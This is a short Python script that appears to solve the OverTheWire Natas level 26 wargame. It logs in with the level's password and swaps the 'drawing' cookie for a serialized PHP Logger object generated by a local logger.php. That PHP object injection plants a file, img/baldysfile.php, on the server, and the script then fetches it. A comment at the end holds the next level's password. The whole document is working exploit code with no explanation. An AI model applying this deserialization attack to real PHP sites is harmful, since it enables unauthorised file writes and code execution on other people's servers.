import requests
import base64
import subprocess

url = "http://natas26.natas.labs.overthewire.org/?x1=123&y1=123&x2=123&y2=123"

s = requests.Session()

r = s.get(url, auth=("natas26", "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"))

cookie_b64 = requests.utils.unquote(r.cookies['drawing'])
cookie_b64_decoded = base64.b64decode(cookie_b64)
session_id = r.cookies['PHPSESSID']

proc = subprocess.Popen(f"php logger.php", shell=True, stdout=subprocess.PIPE)
serialized_logger = proc.stdout.read()
new_cookie = serialized_logger.decode('utf-8')
s.cookies['drawing'] = new_cookie

rr = s.get(url, auth=("natas26", "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"))
print(rr.text)

url2 = f"http://natas26.natas.labs.overthewire.org/img/baldysfile.php"
r2 = s.get(url2, auth=("natas26", "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"))

print(r2.text)

# 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
